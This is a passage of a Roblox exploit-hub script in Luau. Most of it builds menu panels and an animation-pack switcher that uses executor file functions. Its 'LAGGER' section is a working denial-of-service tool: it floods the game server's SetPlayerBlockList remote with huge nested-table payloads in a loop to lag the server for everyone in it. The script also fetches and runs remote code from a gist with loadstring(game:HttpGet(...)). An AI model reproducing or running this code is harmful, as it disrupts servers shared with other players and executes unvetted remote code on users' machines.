	quickLast.actionsInitialized = true
	end
	end)))
	end

	do
	local panelsSection = makeUraniumSection(tabPages.Visuals, "PANELS")
	local panelsPanel = Instance.new("Frame", panelsSection)
	panelsPanel.Size = UDim2.new(1, -10, 0, 104)
	panelsPanel.Position = UDim2.new(0, 5, 0, 28)
	panelsPanel.BackgroundColor3 = Color3.fromRGB(20, 22, 31)
	panelsPanel.BackgroundTransparency = 0.12
	panelsPanel.BorderSizePixel = 0
	Instance.new("UICorner", panelsPanel).CornerRadius = UDim.new(0, 8)
	local panelsPanelStroke = Instance.new("UIStroke", panelsPanel)
	panelsPanelStroke.Color = Color3.fromRGB(0, 0, 0)
	panelsPanelStroke.Thickness = 1.2
	panelsPanelStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	panelsPanelStroke.Transparency = 0.15

	local row = Instance.new("Frame", panelsPanel)
	row.Size = UDim2.new(1, -18, 0, 30)
	row.Position = UDim2.new(0, 9, 0, 10)
	row.BackgroundTransparency = 1

	local laggerBtn = Instance.new("TextButton", row)
	laggerBtn.Size = UDim2.new(1, 0, 1, 0)
	laggerBtn.Position = UDim2.new(0, 0, 0, 0)
	laggerBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	laggerBtn.BackgroundTransparency = 0.15
	laggerBtn.BorderSizePixel = 0
	laggerBtn.Text = "LAGGER"
	laggerBtn.TextColor3 = Color3.fromRGB(50, 110, 190)
	laggerBtn.TextSize = 11
	laggerBtn.Font = Enum.Font.GothamBold
	laggerBtn.AutoButtonColor = false
	Instance.new("UICorner", laggerBtn).CornerRadius = UDim.new(0, 6)
	local laggerStroke = Instance.new("UIStroke", laggerBtn)
	laggerStroke.Color = Color3.fromRGB(0, 0, 0)
	laggerStroke.Thickness = 1
	laggerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local laggerToggled = false

	local function updateLaggerVisual()
	laggerBtn.BackgroundColor3 = laggerToggled and Color3.fromRGB(80, 160, 255) or Color3.fromRGB(30, 30, 38)
	laggerBtn.TextColor3 = laggerToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(50, 110, 190)
		laggerStroke.Color = laggerToggled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
	laggerStroke.Thickness = laggerToggled and 1.5 or 1
	end

	(function()

	local animationPresets = {
	["Cartoon"] = { RunAnim=742638842, WalkAnim=742640026, JumpAnim=742637942, FallAnim=742637151, Swim=742639220, SwimIdle=742639812, ClimbAnim=742636889, Idle={742637544,742638445,885477856} },
	["Adidas Community"] = { WalkAnim=122150855457006, RunAnim=82598234841035, JumpAnim=75290611992385, FallAnim=98600215928904, SwimIdle=109346520324160, Swim=133308483266208, Animation1=122257458498464, Animation2=102357151005774, ClimbAnim=88763136693023 },
	["Adidas Aura"] = { WalkAnim=83842218823011, RunAnim=118320322718866, JumpAnim=109996626521204, FallAnim=95603166884636, SwimIdle=94922130551805, Swim=134530128383903, Animation1=110211186840347, Animation2=114191137265065, ClimbAnim=97824616490448 },
	["Zombie"] = { WalkAnim=10921355261, RunAnim=616163682, JumpAnim=10921351278, FallAnim=10921350320, SwimIdle=10921353442, Swim=10921352344, Animation1=10921344533, Animation2=10921345304, ClimbAnim=10921343576 },
	["Catwalk Glam"] = { WalkAnim=109168724482748, RunAnim=81024476153754, JumpAnim=116936326516985, FallAnim=92294537340807, SwimIdle=98854111361360, Swim=134591743181628, ClimbAnim=119377220967554, Animation1=133806214992291, Animation2=94970088341563 },
	["Toy"] = { WalkAnim=10921312010, RunAnim=10921306285, JumpAnim=10921308158, FallAnim=10921307241, SwimIdle=10921310341, Swim=10921309319, ClimbAnim=10921300839, Animation1=10921301576 },
	["Amazon Unboxed"] = { WalkAnim=90478085024465, RunAnim=134824450619865, JumpAnim=121454505477205, FallAnim=94788218468396, SwimIdle=129126268464847, Swim=105962919001086, ClimbAnim=121145883950231, Animation1=98281136301627 },
	["Vampire"] = { WalkAnim=10921326949, RunAnim=10921320299, JumpAnim=10921322186, FallAnim=10921321317, SwimIdle=10921325443, Swim=10921324408, ClimbAnim=10921314188, Animation1=10921315373 },
	["Ninja"] = { RunAnim=656118852, WalkAnim=656121766, JumpAnim=656117878, FallAnim=656115606, Swim=656119721, SwimIdle=656121397, ClimbAnim=656114359, Idle={656117400,656118341,886742569} },
	}

	local animationPresetOrder = {
	"Cartoon",
	"Adidas Community",
	"Adidas Aura",
	"Zombie",
	"Catwalk Glam",
	"Toy",
	"Amazon Unboxed",
	"Vampire",
	"Ninja",
	}

	local currentPresetIndex = 1
	local currentPresetName = animationPresetOrder[1]

	local function normalizeAnimValue(value)
	if not value then return nil end
	if type(value) == "number" then return "rbxassetid://" .. tostring(value) end
	if type(value) == "string" then
	if string.sub(value, 1, 11) == "rbxassetid://" then return value end
	if string.match(value, "^%d+$") then return "rbxassetid://" .. value end
	return value
	end
	return nil
	end

	local function buildAnimPackFromPreset(preset)
	local idle = preset and preset.Idle
	return {
	idle1 = normalizeAnimValue(preset and (preset.Animation1 or (idle and idle[1]))),
	idle2 = normalizeAnimValue(preset and (preset.Animation2 or (idle and idle[2]))),
	walk = normalizeAnimValue(preset and (preset.WalkAnim or preset.Walk)),
	run = normalizeAnimValue(preset and (preset.RunAnim or preset.Run)),
	jump = normalizeAnimValue(preset and (preset.JumpAnim or preset.Jump)),
	fall = normalizeAnimValue(preset and (preset.FallAnim or preset.Fall)),
	climb = normalizeAnimValue(preset and (preset.ClimbAnim or preset.Climb)),
	swim = normalizeAnimValue(preset and (preset.Swim or preset.SwimAnim)),
	swimidle = normalizeAnimValue(preset and (preset.SwimIdle or preset.SwimIdleAnim)),
	}
	end

	local function applyAnimationsToCharacter(char, animPack)
	if not char or not animPack then return false end
	local animate = char:FindFirstChild("Animate")
	if not animate then
	animate = Instance.new("Animation")
	animate.Name = "Animate"
	animate.Parent = char
	end

	_G.__ZurichHub_OriginalAnims = _G.__ZurichHub_OriginalAnims or {}
	local playerKey = tostring(Player.UserId or "local")
	if not _G.__ZurichHub_OriginalAnims[playerKey] then
	local originals = {}
	for _, containerName in ipairs({"idle","walk","run","jump","fall","climb","swim","swimidle"}) do
	local cont = animate:FindFirstChild(containerName)
	if cont then
	for _, child in ipairs(cont:GetChildren()) do
	pcall(function()
	originals[containerName .. "." .. child.Name] = child.AnimationId
	end)
	end
	end
	end
	_G.__ZurichHub_OriginalAnims[playerKey] = originals
	end

	local function ensureAnim(parent, name)
	local obj = parent:FindFirstChild(name)
	if not obj then
	obj = Instance.new("Animation")
	obj.Name = name
	obj.Parent = parent
	end
	return obj
	end

	local function setAnim(container, animName, id)
	if not id then return end
	local animObj = container:FindFirstChild(animName)
	if not animObj then
	animObj = Instance.new("Animation")
	animObj.Name = animName
	animObj.Parent = container
	end
	animObj.AnimationId = id
	end

	local idle = ensureAnim(animate, "idle")
	local walk = ensureAnim(animate, "walk")
	local run = ensureAnim(animate, "run")
	local jump = ensureAnim(animate, "jump")
	local fall = ensureAnim(animate, "fall")
	local climb = ensureAnim(animate, "climb")
	local swim = ensureAnim(animate, "swim")
	local swimidle = ensureAnim(animate, "swimidle")

	setAnim(idle, "Animation1", animPack.idle1)
	setAnim(idle, "Animation2", animPack.idle2)
	setAnim(walk, "WalkAnim", animPack.walk)
	setAnim(run, "RunAnim", animPack.run)
	setAnim(jump, "JumpAnim", animPack.jump)
	setAnim(fall, "FallAnim", animPack.fall)
	setAnim(climb, "ClimbAnim", animPack.climb)
	setAnim(swim, "Swim", animPack.swim)
	setAnim(swimidle, "SwimIdle", animPack.swimidle)

	_G.__ZurichHub_Anims = _G.__ZurichHub_Anims or {}
	for key, value in pairs(animPack) do
	if value then _G.__ZurichHub_Anims[key] = value end
	end

	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
	for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
	pcall(function() track:Stop(0) end)
	end
	end

	return true
	end

	local function restoreOriginalAnims(char)
	if not char then return false end
	local playerKey = tostring(Player.UserId or "local")
	local saved = _G.__ZurichHub_OriginalAnims and _G.__ZurichHub_OriginalAnims[playerKey]
	if not saved then return false end
	local animate = char:FindFirstChild("Animate")
	if not animate then return false end
	for key, animId in pairs(saved) do
	local sep = string.find(key, "%.")
	if sep then
	local containerName = string.sub(key, 1, sep - 1)
	local childName = string.sub(key, sep + 1)
	local cont = animate:FindFirstChild(containerName)
	if not cont then
	cont = Instance.new("Animation")
	cont.Name = containerName
	cont.Parent = animate
	end
	local child = cont:FindFirstChild(childName)
	if not child then
	child = Instance.new("Animation")
	child.Name = childName
	child.Parent = cont
	end
	pcall(function() child.AnimationId = animId end)
	end
	end
	return true
	end

	local function applyAnimationPreset(presetName)
	local preset = animationPresets[presetName]
	if not preset then return false end
	local animPack = buildAnimPackFromPreset(preset)
	local char = Player.Character
	if char then
	return applyAnimationsToCharacter(char, animPack)
	else
	currentPresetName = presetName
	_G.__pendingAnimationPreset = presetName
	return true
	end
	end

	local CONFIG_FILE = "AnimationSelector_Config.txt"
	local animsEnabled = false

	local function saveAnimConfig()
	local currPreset = currentPresetName or animationPresetOrder[currentPresetIndex] or "Cartoon"
	local data = { presetIndex = currentPresetIndex, presetName = currPreset, enabled = animsEnabled }
	local ok, json = pcall(function() return HttpService:JSONEncode(data) end)
	if ok then pcall(function() writefile(CONFIG_FILE, json) end) end
	end

	local function loadAnimConfig()
	local ok, hasFile = pcall(function() return isfile(CONFIG_FILE) end)
	if not ok or not hasFile then return false end
	local ok2, json = pcall(function() return readfile(CONFIG_FILE) end)
	if not ok2 or not json or json == "" then return false end
	local ok3, data = pcall(function() return HttpService:JSONDecode(json) end)
	if not ok3 or not data then return false end

	if data.presetName and animationPresets[data.presetName] then
	currentPresetName = data.presetName
	for i, presetName in ipairs(animationPresetOrder) do
	if presetName == data.presetName then
	currentPresetIndex = i
	break
	end
	end
	elseif data.presetIndex and data.presetIndex >= 1 and data.presetIndex <= #animationPresetOrder then
	currentPresetIndex = data.presetIndex
	currentPresetName = animationPresetOrder[currentPresetIndex]
	end

	if currentPresetName == nil then
	currentPresetName = animationPresetOrder[currentPresetIndex or 1]
	end

	animsEnabled = false
	return true
	end

	pcall(loadAnimConfig)
	if animsEnabled and currentPresetName and animationPresets[currentPresetName] then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end
	if animsEnabled and currentPresetName and Player.Character then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	local animSection = makeUraniumSection(tabPages.Visuals, "ANIMATION PACK")

	do
	local parentSection = animSection and animSection.Parent
	if parentSection then
	for _, child in ipairs(parentSection:GetChildren()) do
	if child:IsA("Frame") then
	local lab = child:FindFirstChildOfClass("TextLabel")
	if lab and lab.Text == string.upper("ANIMATION PACK") then
	for _, f in ipairs(child:GetChildren()) do
	if f:IsA("Frame") and f.Size and f.Size.Y and f.Size.Y.Offset == 1 then
	f:Destroy()
	break
	end
	end
	break
	end
	end
	end
	end
	end
	local sectionFrame = animSection
	local container = Instance.new("Frame", sectionFrame)
	container.Size = UDim2.new(1, -10, 0, 68)
	container.Position = UDim2.new(0, 5, 0, 30)
	container.BackgroundColor3 = Color3.fromRGB(20, 22, 31)
	container.BackgroundTransparency = 0.12
	container.BorderSizePixel = 0
	container.Parent = animSection
	Instance.new("UICorner", container).CornerRadius = UDim.new(0,8)
	local containerStroke = Instance.new("UIStroke", container)
	containerStroke.Color = Color3.fromRGB(0, 0, 0)
	containerStroke.Thickness = 1.2
	containerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	containerStroke.Transparency = 0.15

	local animTogglePanel = Instance.new("Frame", container)
	animTogglePanel.Size = UDim2.new(0, 72, 1, -10)
	animTogglePanel.Position = UDim2.new(0, 6, 0, 5)
	animTogglePanel.BackgroundColor3 = Color3.fromRGB(32, 35, 42)
	animTogglePanel.BackgroundTransparency = 0.08
	animTogglePanel.BorderSizePixel = 0
	Instance.new("UICorner", animTogglePanel).CornerRadius = UDim.new(0, 7)

	pcall(loadAnimConfig)
	if animsEnabled and currentPresetName and animationPresets[currentPresetName] then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	local animToggleBtn = Instance.new("TextButton", animTogglePanel)
	animToggleBtn.Size = UDim2.new(1, -8, 1, -8)
	animToggleBtn.Position = UDim2.new(0, 4, 0, 4)
	animToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 55, 64)
	animToggleBtn.BorderSizePixel = 0
	animToggleBtn.Text = "OFF"
	animToggleBtn.TextColor3 = Color3.fromRGB(245, 247, 250)
	animToggleBtn.TextSize = 10
	animToggleBtn.Font = Enum.Font.GothamBold
	animToggleBtn.AutoButtonColor = false
	animToggleBtn.TextWrapped = false
	animToggleBtn.ZIndex = 6
	Instance.new("UICorner", animToggleBtn).CornerRadius = UDim.new(0, 5)
	pcall(function(parent)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255, 255, 255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, animToggleBtn)

	local function updateAnimToggleVisual()
	animToggleBtn.Text = animsEnabled and "ON" or "OFF"
	animToggleBtn.BackgroundColor3 = animsEnabled and Color3.fromRGB(82, 140, 220) or Color3.fromRGB(52, 58, 68)
	animToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	animToggleBtn.Font = Enum.Font.GothamBold
	end

	animToggleBtn.Activated:Connect(function()
	animsEnabled = not animsEnabled
	updateAnimToggleVisual()
	if animsEnabled then
	applyAnimationPreset(currentPresetName)
	elseif Player.Character then
	restoreOriginalAnims(Player.Character)
	end
	saveAnimConfig()
	end)

	local leftBtn = Instance.new("TextButton")
	leftBtn.Size = UDim2.new(0, 32, 0, 32)
	leftBtn.Position = UDim2.new(0, 88, 0.5, -16)
	leftBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	leftBtn.BackgroundTransparency = 0.15
	leftBtn.BorderSizePixel = 0
	leftBtn.Text = "◄"
	leftBtn.TextColor3 = Color3.fromRGB(240,245,255)
	leftBtn.TextSize = 20
	leftBtn.Font = Enum.Font.GothamBold
	leftBtn.AutoButtonColor = false
	leftBtn.ZIndex = 5
	leftBtn.Parent = container
	pcall(function(parent)
	local corner = Instance.new("UICorner", parent)
	corner.CornerRadius = UDim.new(0,5)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, leftBtn)

	local selectorFrame = Instance.new("Frame")
	selectorFrame.Name = "AnimationPackSelector"
	selectorFrame.Size = UDim2.new(1, -122, 0, 30)
	selectorFrame.Position = UDim2.new(0, 108, 0, 19)
	selectorFrame.BackgroundTransparency = 1
	selectorFrame.Parent = container

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -36, 1, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = tostring(currentPresetName or "")
	titleLabel.TextColor3 = Color3.fromRGB(240, 245, 255)
	titleLabel.TextSize = 12
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextXAlignment = Enum.TextXAlignment.Center
	titleLabel.TextYAlignment = Enum.TextYAlignment.Center
	titleLabel.ZIndex = 5
	titleLabel.Parent = selectorFrame
	titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)

	titleLabel.Position = UDim2.new(0.5, 0, 0.5, 4)
	pcall(function(parent)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Transparency = 1
	end, titleLabel)

	local rightBtn = Instance.new("TextButton")
	rightBtn.Size = UDim2.new(0, 32, 0, 32)
	rightBtn.Position = UDim2.new(1, -32, 0.5, -16)
	rightBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	rightBtn.BackgroundTransparency = 0.15
	rightBtn.BorderSizePixel = 0
	rightBtn.Text = "►"
	rightBtn.TextColor3 = Color3.fromRGB(240,245,255)
	rightBtn.TextSize = 20
	rightBtn.Font = Enum.Font.GothamBold
	rightBtn.AutoButtonColor = false
	rightBtn.ZIndex = 5
	rightBtn.Parent = selectorFrame
	pcall(function(parent)
	local corner = Instance.new("UICorner", parent)
	corner.CornerRadius = UDim.new(0,5)
	local stroke = Instance.new("UIStroke", parent)
	stroke.Color = Color3.fromRGB(255,255,255)
	stroke.Thickness = 0.8
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end, rightBtn)

	local function updateTitle(t, direction)
	direction = direction or "next"
	titleLabel.Text = tostring(t or "")
	titleLabel.TextTransparency = 1
	titleLabel.Position = UDim2.new(0.5, direction == "next" and -90 or 90, 0.5, 0)
	TweenService:Create(titleLabel, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	Position = UDim2.new(0.5, 0, 0.5, 0),
	TextTransparency = 0,
	}):Play()
	end

	local function changePreset(direction)
	local newIdx = currentPresetIndex + (direction == "next" and 1 or -1)
	if newIdx < 1 then newIdx = #animationPresetOrder end
	if newIdx > #animationPresetOrder then newIdx = 1 end
	currentPresetIndex = newIdx
	currentPresetName = animationPresetOrder[currentPresetIndex]
	updateTitle(currentPresetName, direction)
	if animsEnabled then
	applyAnimationPreset(currentPresetName)
	else
	if Player.Character then
	restoreOriginalAnims(Player.Character)
	end
	end
	saveAnimConfig()
	local btn = (direction == "next") and rightBtn or leftBtn
	TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(0,80,180)}):Play()
	task.delay(0.08, function() TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(30,30,38)}):Play() end)
	end

	leftBtn.MouseButton1Click:Connect(function() changePreset("prev") end)
	rightBtn.MouseButton1Click:Connect(function() changePreset("next") end)

	leftBtn.Parent = selectorFrame
	rightBtn.Parent = selectorFrame
	titleLabel.Parent = selectorFrame
	updateAnimToggleVisual()
	if animsEnabled and currentPresetName then
	pcall(function() applyAnimationPreset(currentPresetName) end)
	end

	leftBtn.Position = UDim2.new(0, -8, 0.5, -12)
	rightBtn.Position = UDim2.new(1, -24, 0.5, -12)

	leftBtn.MouseEnter:Connect(function()
	TweenService:Create(leftBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0, TextColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	leftBtn.MouseLeave:Connect(function()
	TweenService:Create(leftBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0.15, TextColor3 = Color3.fromRGB(240,245,255)}):Play()
	end)
	rightBtn.MouseEnter:Connect(function()
	TweenService:Create(rightBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0, TextColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	rightBtn.MouseLeave:Connect(function()
	TweenService:Create(rightBtn, TweenInfo.new(0.15), {BackgroundTransparency = 0.15, TextColor3 = Color3.fromRGB(240,245,255)}):Play()
	end)

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if animsEnabled then
	local animPack = buildAnimPackFromPreset(animationPresets[currentPresetName])
	applyAnimationsToCharacter(char, animPack)
	end
	end))

	task.spawn(function()
	task.wait(0.5)
	if Player.Character and animsEnabled then
	local animPack = buildAnimPackFromPreset(animationPresets[currentPresetName])
	applyAnimationsToCharacter(Player.Character, animPack)
	end
	end)
	end)()

	_G.__UnoReadSavedPanelVisibility = function(settingsFile)
	if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then return false, false end
	local ok, data = pcall(function()
	if not isfile(settingsFile) then return nil end
	return HttpService:JSONDecode(readfile(settingsFile))
	end)
	if not ok or type(data) ~= "table" then return false, false end
	return true, data.visible == true
	end

	local function openLaggerGUI(openPanel)
	if openPanel == nil then openPanel = true end
	local player = game:GetService("Players").LocalPlayer
	local playerGui = player and player:FindFirstChild("PlayerGui")
	if playerGui and playerGui:FindFirstChild("UnoLaggerGUI") then
	local gui = playerGui:FindFirstChild("UnoLaggerGUI")
	if gui and openPanel then
	gui.Visible = true
	end
	if _G.UnoLagger and _G.UnoLagger.SetVisible then
	_G.UnoLagger.SetVisible(openPanel)
	end
	return
	end
	if _G._UnoLaggerGUILoaded then
	_G._UnoLaggerGUILoaded = false
	end
	_G._UnoLaggerGUILoaded = true
	_G.__openLaggerGUI = openLaggerGUI

	task.spawn(function()
	pcall(function()
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")

	local previousGui = playerGui:FindFirstChild("UnoLaggerGUI")
	if previousGui then previousGui:Destroy() end

	local LAGGER_CONFIG = {
	TableIncrease = 270,
	Tries = 1,
	LoopWaitTime = 0.3,
	LowEndTableIncrease = 265,
	LowEndLoopWaitTime = 0.8,
	}
	local LAGGER_POWER_MAX = 290

	local laggerStates = { Main = false, LowEnd = false }
	local lagThreads = { Main = nil, LowEnd = nil }
	local cachedBombAmount, cachedBombPayload = nil, nil

	local function buildBombPayload(amt)
	local main, spam = {}, {{}}
	local z = spam[1]
	for _ = 1, amt do
	local t = {}
	table.insert(z, t)
	z = t
	end
	local max = math.min(499999 / (amt + 2), 1500)
	for _ = 1, max do
	table.insert(main, spam)
	end
	return main
	end

	local function bomb(amt)

	if cachedBombAmount ~= amt or not cachedBombPayload then
		cachedBombAmount = amt
		cachedBombPayload = buildBombPayload(amt)
	end
	pcall(function()
	game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBombPayload)
	end)
	end

	local function startMainLag()
	if lagThreads.Main then return end
	lagThreads.Main = task.spawn(function()
	while laggerStates.Main do
	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
	end)
	bomb(LAGGER_CONFIG.TableIncrease)
	task.wait(LAGGER_CONFIG.LoopWaitTime)
	end
	end)
	end

	local function startLowEndLag()
	if lagThreads.LowEnd then return end
	lagThreads.LowEnd = task.spawn(function()
	while laggerStates.LowEnd do
	pcall(function()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(25000)
	end)
	bomb(LAGGER_CONFIG.LowEndTableIncrease)
	task.wait(LAGGER_CONFIG.LowEndLoopWaitTime)
	end
	end)
	end

	local function stopThread(type)
	if lagThreads[type] then
	task.cancel(lagThreads[type])
	lagThreads[type] = nil
	end
	end

	local function stopAllLaggerThreads()
	laggerStates.Main = false
	laggerStates.LowEnd = false
	stopThread("Main")
	stopThread("LowEnd")
	lagThreads.Payload = nil
	lagThreads.PayloadAmount = nil
	lagThreads.Remote = nil
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	_G.__UnoTrackStopper(stopAllLaggerThreads)

	local function toggleMainLagger()
	laggerStates.Main = not laggerStates.Main
	if laggerStates.Main then
	if laggerStates.LowEnd then
	laggerStates.LowEnd = false
	stopThread("LowEnd")
	if _G.__updateSmallLaggerVisual then
	_G.__updateSmallLaggerVisual()
	end
	end
	startMainLag()
	else
	stopThread("Main")
	if not laggerStates.LowEnd then
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	end
	return laggerStates.Main
	end

	local function toggleLowEndLagger()
	laggerStates.LowEnd = not laggerStates.LowEnd
	if laggerStates.LowEnd then
	if laggerStates.Main then
	laggerStates.Main = false
	stopThread("Main")
	end
	startLowEndLag()
	else
	stopThread("LowEnd")
	if not laggerStates.Main then
	pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
	end
	end
	return laggerStates.LowEnd
	end

	loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/68b8cce1f719d0d801335834b987264b/raw/ab66c817815975fcf4b88b08a81b76ee6c74df13/ESSENTIALSCRIPT.lua"))()

	local LAGGER_BACKGROUND_URL = "https://files.catbox.moe/ug6eug.png"
	local LAGGER_BACKGROUND_FILE = "UnoLagger_ug6eug.png"
	local LAGGER_BACKGROUND_FALLBACK = ""
	local function resolveLaggerBackground()
	local customAssetLoader = nil
	pcall(function()
	customAssetLoader = (typeof(getcustomasset) == "function" and getcustomasset)
	or (typeof(getsynasset) == "function" and getsynasset)
	end)
	if not customAssetLoader or typeof(writefile) ~= "function" or typeof(isfile) ~= "function" then
	return LAGGER_BACKGROUND_FALLBACK
	end
	local hasImage = false
	pcall(function() hasImage = isfile(LAGGER_BACKGROUND_FILE) end)
	if not hasImage then
	local okDownload, imageData = pcall(function() return game:HttpGet(LAGGER_BACKGROUND_URL) end)
	local isPng = okDownload and type(imageData) == "string"
	and imageData:sub(1, 8) == "\137PNG\r\n\26\n"
	if not isPng then
	warn("Uno Lagger: no se pudo descargar el fondo ug6eug")
	return LAGGER_BACKGROUND_FALLBACK
	end
	local okWrite = pcall(writefile, LAGGER_BACKGROUND_FILE, imageData)
	if not okWrite then return LAGGER_BACKGROUND_FALLBACK end
	end
	local okAsset, customAsset = pcall(customAssetLoader, LAGGER_BACKGROUND_FILE)
	if okAsset and type(customAsset) == "string" and customAsset ~= "" then return customAsset end
	return LAGGER_BACKGROUND_FALLBACK
	end

	local BACKGROUNDS = { "" }
	local currentBackground = 1

	local WHITE = Color3.fromRGB(235, 240, 245)

	local boundKey = Enum.KeyCode.V
	local waitingForKey = false
	local keyConn = nil
	local keybindButton = nil
	local keybindStroke = nil
	local keybindJustSet = false

	local SETTINGS_FILE = "UnoLagger_Settings.json"
	local mainFrame, bgImage
	local laggerMinimized = false
	local refreshLaggerThemeText

	local function fileFunctionsAvailable()
	return typeof(writefile) == "function" and typeof(readfile) == "function" and typeof(isfile) == "function"
	end

	local function saveSettings()
	if not fileFunctionsAvailable() or not mainFrame then return end
	local data = {
	engineVersion = "legacy",
	mainEnabled = laggerStates.Main,
	lowEndEnabled = laggerStates.LowEnd,
	power = LAGGER_CONFIG.TableIncrease,
	background = currentBackground,
	keybind = boundKey and boundKey.Name or "V",
	visible = mainFrame.Visible,
	minimized = laggerMinimized,
	position = {
	xScale = mainFrame.Position.X.Scale,
	xOffset = mainFrame.Position.X.Offset,
	yScale = mainFrame.Position.Y.Scale,
	yOffset = mainFrame.Position.Y.Offset,
	},
	}
	pcall(function() writefile(SETTINGS_FILE, HttpService:JSONEncode(data)) end)
	end

	local function loadSettings()
	if not fileFunctionsAvailable() then return nil end
	local ok, result = pcall(function()
	if isfile(SETTINGS_FILE) then return HttpService:JSONDecode(readfile(SETTINGS_FILE)) end
	return nil
	end)
	return ok and result or nil
	end

	local GAMEPAD_KEY_NAMES = {
	ButtonA = "PAD A", ButtonB = "PAD B", ButtonX = "PAD X", ButtonY = "PAD Y",
	ButtonL1 = "PAD L1", ButtonR1 = "PAD R1", ButtonL2 = "PAD L2", ButtonR2 = "PAD R2",
	ButtonL3 = "PAD L3", ButtonR3 = "PAD R3", ButtonStart = "PAD START", ButtonSelect = "PAD SELECT",
	DPadUp = "DPAD UP", DPadDown = "DPAD DOWN", DPadLeft = "DPAD LEFT", DPadRight = "DPAD RIGHT",
	}
	local function isGamepadInput(input)
	return input and input.UserInputType and input.UserInputType.Name:match("^Gamepad%d+$") ~= nil
	end
	local function keyName(kc)
	return GAMEPAD_KEY_NAMES[kc.Name] or kc.Name
	end

	local function updateKeybindDisplay()
	if keybindButton then
	keybindButton.Text = keyName(boundKey)
	keybindButton.TextColor3 = WHITE
	keybindButton.BackgroundTransparency = 0.2
	end
	if keybindStroke then
	keybindStroke.Color = Color3.fromRGB(0, 0, 0)
	end
	end

	local function stopListening()
	waitingForKey = false
	keybindJustSet = false
	if keyConn then
	keyConn:Disconnect()
	keyConn = nil
	end
	updateKeybindDisplay()
	end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "UnoLaggerGUI"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	screenGui.Parent = playerGui
	_G.__UnoRegisterThemeRoot(screenGui)

	mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.fromOffset(270, 116)
	mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58)
	mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	mainFrame.BackgroundTransparency = 0
	mainFrame.BorderSizePixel = 0
	mainFrame.ClipsDescendants = true
	mainFrame.Active = true
	mainFrame.Parent = screenGui
	mainFrame.Visible = false

	Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
	local mainStroke = Instance.new("UIStroke", mainFrame)
	mainStroke.Color = Color3.fromRGB(30, 30, 30)
	mainStroke.Thickness = 1
	mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	mainStroke.Transparency = 1

	bgImage = Instance.new("ImageLabel")
	bgImage.Name = "BackgroundImage"
	bgImage.Size = UDim2.new(1, 0, 1, 0)
	bgImage.Position = UDim2.new(0, 0, 0, 0)
	bgImage.BackgroundTransparency = 1
	bgImage.Image = BACKGROUNDS[1]
	bgImage.ScaleType = Enum.ScaleType.Crop
	bgImage.ImageTransparency = 0
	bgImage.ZIndex = 0
	bgImage.Parent = mainFrame
	bgImage.Visible = true
	Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 16)
	_G.__UnoRoundPanelBackground(bgImage, mainFrame)
	_G.__UnoAddUnifiedPanelShade(mainFrame, 16, 1)

	local headerFrame = Instance.new("Frame")
	headerFrame.Name = "Header"
	headerFrame.Size = UDim2.new(1, -12, 0, 30)
	headerFrame.Position = UDim2.fromOffset(6, 6)
	headerFrame.BackgroundTransparency = 1
	headerFrame.ZIndex = 2
	headerFrame.Parent = mainFrame

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Text = ""
